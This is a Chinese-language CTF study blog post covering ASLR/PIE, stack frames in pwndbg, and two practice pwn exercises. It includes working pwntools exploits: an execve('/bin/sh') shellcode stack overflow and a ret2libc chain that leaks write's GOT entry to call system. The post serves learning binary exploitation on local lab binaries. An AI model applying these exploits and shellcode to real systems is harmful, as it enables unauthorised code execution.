<h2 id="ASLR和PIE的各种事"><a href="#ASLR和PIE的各种事" class="headerlink" title="ASLR和PIE的各种事"></a>ASLR和PIE的各种事</h2><p>其实我第一遍学的时候以为,emm,这不是一样的东西吗,甚至以为效果是它俩求并就行,靠发现完全不是,<a target="_blank" rel="noopener" href="https://blog.csdn.net/Plus_RE/article/details/79199772">这个</a>写的很棒了,谢谢师傅,在这里简单记录一下技巧吧(表格中提到的是被随机化的,堆另外再提)</p>
<table>
<thead>
<tr>
<th align="center">\</th>
<th align="center">aslr&#x3D;0</th>
<th align="center">aslr&#x3D;1</th>
<th align="center">aslr&#x3D;2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">开启PIE</td>
<td align="center">null</td>
<td align="center">code\data\stack</td>
<td align="center">libc\code\data\stack</td>
</tr>
<tr>
<td align="center">关闭PIE</td>
<td align="center">null</td>
<td align="center">stack</td>
<td align="center">libc\stack</td>
</tr>
</tbody></table>
<p><strong>brk()</strong> 在aslr为1时地址静止,<strong>mmap()</strong> 地址随机</p>
<p>如果你想,emm,那我直接关闭本地aslr不完事了吗,hah,年轻了亚还是,远程服务器可是开着的,掩耳盗铃还行,所以一般情况下我们只能找漏洞点让数据泄漏出来</p>
<h2 id="所有保护全关-跳转执行shellcode"><a href="#所有保护全关-跳转执行shellcode" class="headerlink" title="所有保护全关-&gt;跳转执行shellcode"></a>所有保护全关-&gt;跳转执行shellcode</h2><p>在栈上写shellcode后ret直接指向shellcode就行,最简单的一种利用,但是我们要注意到底要覆盖多少字节,同时我们应该注意这种类型的漏洞关键便是理解好堆栈,我们以下方程序举例,一起分析一下堆栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void hello(int x) &#123;</span><br><span class="line">    printf(&quot;hello %d\n&quot;,x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    hello(3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后直接<code>gcc -m32 test</code>进行编译运行,之后直接到gdb中进行调试<br>首先<code>b main</code>断到main函数,之后一步一步看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0x8048435 &lt;main+14&gt;    sub    esp, 4</span><br><span class="line">  0x8048438 &lt;main+17&gt;    sub    esp, 0xc</span><br><span class="line">► 0x804843b &lt;main+20&gt;    push   3</span><br><span class="line">  0x804843d &lt;main+22&gt;    call   hello &lt;0x804840b&gt;</span><br></pre></td></tr></table></figure>
<p>这是hello函数前的准备,我们只需要注意<code>push 3</code>这步操作,执行完后esp-4,同时指向3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x8048435 &lt;main+14&gt;    sub    esp, 4</span><br><span class="line">   0x8048438 &lt;main+17&gt;    sub    esp, 0xc</span><br><span class="line">   0x804843b &lt;main+20&gt;    push   3</span><br><span class="line"> ► 0x804843d &lt;main+22&gt;    call   hello &lt;0x804840b&gt;</span><br><span class="line">        arg[0]: 0x3</span><br><span class="line">        arg[1]: 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">        arg[2]: 0xffffd0bc —▸ 0xffffd2af ◂— &#x27;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&#x27;</span><br><span class="line">        arg[3]: 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]</span><br><span class="line"> </span><br><span class="line">   0x8048442 &lt;main+27&gt;    add    esp, 0x10</span><br><span class="line">   0x8048445 &lt;main+30&gt;    mov    eax, 0</span><br><span class="line">   0x804844a &lt;main+35&gt;    mov    ecx, dword ptr [ebp - 4]</span><br><span class="line">   0x804844d &lt;main+38&gt;    leave  </span><br><span class="line">   0x804844e &lt;main+39&gt;    lea    esp, [ecx - 4]</span><br><span class="line">   0x8048451 &lt;main+42&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x8048452              nop    </span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcff0 ◂— 0x3</span><br><span class="line">01:0004│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">02:0008│      0xffffcff8 —▸ 0xffffd0bc —▸ 0xffffd2af ◂— &#x27;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&#x27;</span><br><span class="line">03:000c│      0xffffcffc —▸ 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]</span><br><span class="line">04:0010│      0xffffd000 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0</span><br><span class="line">05:0014│      0xffffd004 —▸ 0xffffd020 ◂— 0x1</span><br><span class="line">06:0018│ ebp  0xffffd008 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd00c —▸ 0xf7e16637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br></pre></td></tr></table></figure>
<p>之后call指令,我们把下一个地址即<code>0x8048442</code>入栈,我们<code>s</code>跟进,函数开始了经典的提升栈操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x804840b &lt;hello&gt;       push   ebp</span><br><span class="line">   0x804840c &lt;hello+1&gt;     mov    ebp, esp</span><br><span class="line">   0x804840e &lt;hello+3&gt;     sub    esp, 8</span><br><span class="line">   0x8048411 &lt;hello+6&gt;     sub    esp, 8</span><br><span class="line">   0x8048414 &lt;hello+9&gt;     push   dword ptr [ebp + 8]</span><br><span class="line">   0x8048417 &lt;hello+12&gt;    push   0x80484e0</span><br><span class="line">   0x804841c &lt;hello+17&gt;    call   printf@plt &lt;0x80482e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048421 &lt;hello+22&gt;    add    esp, 0x10</span><br><span class="line">   0x8048424 &lt;hello+25&gt;    nop    </span><br><span class="line">   0x8048425 &lt;hello+26&gt;    leave  </span><br><span class="line">   0x8048426 &lt;hello+27&gt;    ret    </span><br></pre></td></tr></table></figure>
<p>看到执行到<code>hello+6</code>的操作应该是栈被抬高了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 8</span><br><span class="line">00:0000│ esp  0xffffcfd8 ◂— 0x0</span><br><span class="line">01:0004│      0xffffcfdc —▸ 0xf7e1632a (init_cacheinfo+666) ◂— mov    dword ptr [esp + 0xc], 2</span><br><span class="line">02:0008│      0xffffcfe0 ◂— 0x1</span><br><span class="line">... ↓</span><br><span class="line">04:0010│ ebp  0xffffcfe8 —▸ 0xffffd008 ◂— 0x0</span><br><span class="line">05:0014│      0xffffcfec —▸ 0x8048442 (main+27) ◂— add    esp, 0x10</span><br><span class="line">06:0018│      0xffffcff0 ◂— 0x3</span><br><span class="line">07:001c│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br></pre></td></tr></table></figure>
<p>之后的<code> ► 0x8048414 &lt;hello+9&gt;     push   dword ptr [ebp + 8]</code>我们应该知道了,这个是参数,目前具体的堆栈图如下</p>
<table>
<thead>
<tr>
<th align="center">指针</th>
<th align="center">内存</th>
</tr>
</thead>
<tbody><tr>
<td align="center">esp</td>
<td align="center">sth</td>
</tr>
<tr>
<td align="center">esp+4</td>
<td align="center">sth</td>
</tr>
<tr>
<td align="center">esp+8</td>
<td align="center">sth</td>
</tr>
<tr>
<td align="center">esp+c</td>
<td align="center">sth</td>
</tr>
<tr>
<td align="center">ebp</td>
<td align="center">$ebp</td>
</tr>
<tr>
<td align="center">ebp+4</td>
<td align="center">ret</td>
</tr>
<tr>
<td align="center">ebp+8</td>
<td align="center">3</td>
</tr>
</tbody></table>
<p>之后的调用我们就不谈了,继续到<code>leave</code>指令,所谓这个指令就是和抬升栈相反,我们只需要记住这是反操作就行了,执行完后指针下移,ret返回主函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x8048417 &lt;hello+12&gt;    push   0x80484e0</span><br><span class="line">   0x804841c &lt;hello+17&gt;    call   printf@plt &lt;0x80482e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048421 &lt;hello+22&gt;    add    esp, 0x10</span><br><span class="line">   0x8048424 &lt;hello+25&gt;    nop    </span><br><span class="line">   0x8048425 &lt;hello+26&gt;    leave  </span><br><span class="line"> ► 0x8048426 &lt;hello+27&gt;    ret             &lt;0x8048442; main+27&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048442 &lt;main+27&gt;     add    esp, 0x10</span><br><span class="line">   0x8048445 &lt;main+30&gt;     mov    eax, 0</span><br><span class="line">   0x804844a &lt;main+35&gt;     mov    ecx, dword ptr [ebp - 4]</span><br><span class="line">   0x804844d &lt;main+38&gt;     leave  </span><br><span class="line">   0x804844e &lt;main+39&gt;     lea    esp, [ecx - 4]</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcfec —▸ 0x8048442 (main+27) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffcff0 ◂— 0x3</span><br><span class="line">02:0008│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">03:000c│      0xffffcff8 —▸ 0xffffd0bc —▸ 0xffffd2af ◂— &#x27;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&#x27;</span><br><span class="line">04:0010│      0xffffcffc —▸ 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]</span><br><span class="line">05:0014│      0xffffd000 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0</span><br><span class="line">06:0018│      0xffffd004 —▸ 0xffffd020 ◂— 0x1</span><br><span class="line">07:001c│ ebp  0xffffd008 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>顺利结束</p>
<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>我们简单使用<strong>一步一步学ROP之linux_x86篇</strong>的level1简单练习一下exp只需要改一下ret就行,我们找一下使用cyclic生成字符串后贴到里边,找到$esp-144,得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0xc9</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcfb0 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> EDX  0x100</span><br><span class="line"> EDI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x6261616a (&#x27;jaab&#x27;)</span><br><span class="line"> ESP  0xffffd040 ◂— &#x27;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line"> EIP  0x6261616b (&#x27;kaab&#x27;)</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x6261616b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd040 ◂— &#x27;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">01:0004│      0xffffd044 ◂— &#x27;maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">02:0008│      0xffffd048 ◂— &#x27;naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">03:000c│      0xffffd04c ◂— &#x27;oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">04:0010│      0xffffd050 ◂— &#x27;paabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">05:0014│      0xffffd054 ◂— &#x27;qaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">06:0018│      0xffffd058 ◂— &#x27;raabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">07:001c│      0xffffd05c ◂— &#x27;saabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br></pre></td></tr></table></figure>
<p>可见是<code>0xffffd040-144</code>,所以直接填到里边,exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./level1&#x27;)</span><br><span class="line"></span><br><span class="line">ret = 0xffffd040-144</span><br><span class="line"></span><br><span class="line"># execve (&quot;/bin/sh&quot;) </span><br><span class="line"># xor ecx, ecx</span><br><span class="line"># mul ecx</span><br><span class="line"># push ecx</span><br><span class="line"># push 0x68732f2f   ;; hs//</span><br><span class="line"># push 0x6e69622f   ;; nib/</span><br><span class="line"># mov ebx, esp</span><br><span class="line"># mov al, 11</span><br><span class="line"># int 0x80</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">payload =  shellcode + &#x27;A&#x27; * (140 - len(shellcode))   + p32(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>但是在实际运行时发生错误,发现竟然相差0x10个字节,ret是<code>0xffffd050-144</code>,我并不知道为什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd050 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0</span><br><span class="line">01:0004│      0xffffd054 —▸ 0x80481fc ◂— add    byte ptr cs:[eax], al /* &#x27;.&#x27; */</span><br><span class="line">02:0008│      0xffffd058 —▸ 0x8048469 (__libc_csu_init+9) ◂— add    ebx, 0x1b8b</span><br><span class="line">03:000c│      0xffffd05c ◂— 0x0</span><br><span class="line">04:0010│      0xffffd060 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">... ↓</span><br><span class="line">06:0018│      0xffffd068 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd06c —▸ 0xf7e16637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 ffffcfb0</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/32gx $esp-144</span><br><span class="line">0xffffcfc0:	0x2f2f6851e1f7c931	0x896e69622f686873</span><br><span class="line">0xffffcfd0:	0x41414180cd0bb0e3	0x4141414141414141</span><br><span class="line">0xffffcfe0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffcff0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd000:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd010:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd020:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd030:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd040:	0x4141414141414141	0xffffcfb041414141</span><br><span class="line">0xffffd050:	0x080481fcf7fb03dc	0x0000000008048469</span><br><span class="line">0xffffd060:	0xf7fb0000f7fb0000	0xf7e1663700000000</span><br><span class="line">0xffffd070:	0xffffd10400000001	0x00000000ffffd10c</span><br><span class="line">0xffffd080:	0x0000000000000000	0xf7ffdc04f7fb0000</span><br><span class="line">0xffffd090:	0x00000000f7ffd000	0xf7fb0000f7fb0000</span><br><span class="line">0xffffd0a0:	0x762412ab00000000	0x000000004b4f1cbb</span><br><span class="line">0xffffd0b0:	0x0000000000000000	0x0804835000000001</span><br><span class="line">pwndbg&gt; p $esp</span><br><span class="line">$1 = (void *) 0xffffd050</span><br></pre></td></tr></table></figure>
<p>今天努力分析一下原因吧,虽然也能调出来,但是这佛系bug让我属实难以接受,不知道和本机环境有没有关系</p>
<h2 id="简单的解释"><a href="#简单的解释" class="headerlink" title="简单的解释"></a>简单的解释</h2><p>简单看一下这个bug,我自己写了一个小demo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int y=1;</span><br><span class="line">	printf(&quot;%p\n&quot;,&amp;y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们打印出来就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ./a.out     </span><br><span class="line">0x7fffffffde54</span><br></pre></td></tr></table></figure>
<p>可是使用pwntools直接process启这个进程发现确实会出现向后偏移0x10字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&#x27;./a.out&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  demo python te.py </span><br><span class="line">[+] Starting local process &#x27;./a.out&#x27;: pid 13184</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./a.out&#x27; stopped with exit code 0 (pid 13184)</span><br><span class="line">[DEBUG] Received 0xf bytes:</span><br><span class="line">    &#x27;0x7fffffffde64\n&#x27;</span><br><span class="line">0x7fffffffde64</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &#x27;\n&#x27; * 0x1</span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>
<p>发现这是一个普遍问题,所以以后找ret地址必须要gdb进行调试后再填写,不然会出现问题,当然解决办法也可以是多填写一些<code>nop</code>,只要位置够,当然象这种直接在栈上写shellcode的题也确实不多,毕竟这么简单</p>
<p>今天主要运用rop解决pwn,其中有很多繁杂的知识点我们一起处理一下,源程序还是那个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">  </span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">    char buf[128];</span><br><span class="line">    read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是这次开了aslr和nx,所以我们必须把这些东西泄漏出来,,我们直接根据exp来分析.具体操作如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;libc.so&#x27;)</span><br><span class="line">elf = ELF(&#x27;level2&#x27;)</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./level2&#x27;)</span><br><span class="line">#p = remote(&#x27;127.0.0.1&#x27;, 10003)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[&#x27;write&#x27;]</span><br><span class="line">print &#x27;plt_write= &#x27; + hex(plt_write)</span><br><span class="line">got_write = elf.got[&#x27;write&#x27;]</span><br><span class="line">print &#x27;got_write= &#x27; + hex(got_write)</span><br><span class="line">vulfun_addr = 0x08048404</span><br><span class="line">print &#x27;vulfun= &#x27; + hex(vulfun_addr)</span><br><span class="line"></span><br><span class="line">payload1 = &#x27;a&#x27;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)</span><br><span class="line"></span><br><span class="line">print &quot;\n###sending payload1 ...###&quot;</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">print &quot;\n###receving write() addr...###&quot;</span><br><span class="line">write_addr = u32(p.recv(4))</span><br><span class="line">print &#x27;write_addr=&#x27; + hex(write_addr)</span><br><span class="line"></span><br><span class="line">print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;</span><br><span class="line">system_addr = write_addr - (libc.symbols[&#x27;write&#x27;] - libc.symbols[&#x27;system&#x27;])</span><br><span class="line">print &#x27;system_addr= &#x27; + hex(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[&#x27;write&#x27;] - next(libc.search(&#x27;/bin/sh&#x27;)))</span><br><span class="line">print &#x27;binsh_addr= &#x27; + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = &#x27;a&#x27;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">print &quot;\n###sending payload2 ...###&quot;</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="纸上谈兵"><a href="#纸上谈兵" class="headerlink" title="纸上谈兵"></a>纸上谈兵</h2><p>首先我们根据objdump能搞出来write函数的got和plt表,之后可以利用<code>plt_write</code>把<code>got_write</code>即真正到内存里的地址泄漏出来,得到<code>got_write</code>后我们又有原来的libc,故而能根据偏移找到system和sh的地址,而这个这个程序很简单,我们可以有一个<code>vulfun_addr</code>函数不断的跳,也算是一个很好的工具函数</p>
<blockquote>
<p>got和plt</p>
</blockquote>
<p>在这个exp中我们可以简单理解一下这两个惺惺相惜的表,所谓got就是到内存中的真实地址,而plt只是链接到got的一个跳转表,使用plt可以使用该函数,而同时我们应该注意,在执行<code>call function</code>时要填入got地址,因为是直接去调用</p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>所谓栈溢出就是告诉我们函数调用过程时会把ret即函数执行完的地址放入栈中,我们利用缓冲区的溢出将其覆盖后即可跳转到我们自己的shellcode</p>
<h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><p>本篇在shellcode的变形让我受益匪浅比如一些很恶心的题会将我们的输入进行解码在写到栈中,所以我们必须先逆向出来算法,当然一般这种题的知识点点到为止,不会在算法上太难为我们,而shellcode变形这块就更恶心了.</p>
<p>例如我们在栈中写入了shellcode,我们到eip时跳到shellcode开始处,这时我们的shellcode含有一些push操作,这时如果我们的shellcode结尾布置到了紧靠esp的位置,那就要考虑是否有覆盖的问题,所以这时的解决方法就是将shellcode进行拆分,中间有一个<code>jump $当前指令+偏移量</code>进行拼接,即可完成起shell</p>
